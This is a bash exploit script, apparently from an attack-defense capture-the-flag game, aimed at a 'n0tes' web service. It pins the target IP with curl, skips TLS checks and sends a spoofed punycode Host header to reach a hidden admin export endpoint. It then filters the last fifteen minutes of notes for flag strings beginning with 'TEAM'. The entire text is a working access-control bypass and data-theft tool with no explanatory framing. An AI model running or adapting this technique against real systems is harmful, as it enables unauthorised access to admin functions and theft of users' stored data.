#!/bin/bash

if [[ $@ == "--help" || $@ == "-h" || $# -eq 0 ]]; then
    echo "Usage: $0 <host>"
    exit 0
fi

ip=$1

if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    resolve_msg="$(host $ip)"
    ret=$?
    if [ $ret -ne 0 ]; then
        >&2 echo "$resolve_msg"
        exit $ret
    fi

    ip=$(awk '/has address/ { print $4 }' <<< $resolve_msg)
fi

curl -ks --resolve admin.n0tes.ctf.hitb.org:443:$ip https://admin.n0tes.ctf.hitb.org/export -H "Host: xn--admin-.n0tes.ctf.hitb.org" | jq -r '.[] | select(.createdUtcDate > (now - 60*15 | strftime("%Y-%m-%dT%H:%M.")) and (.content | startswith("TEAM"))) | .content'
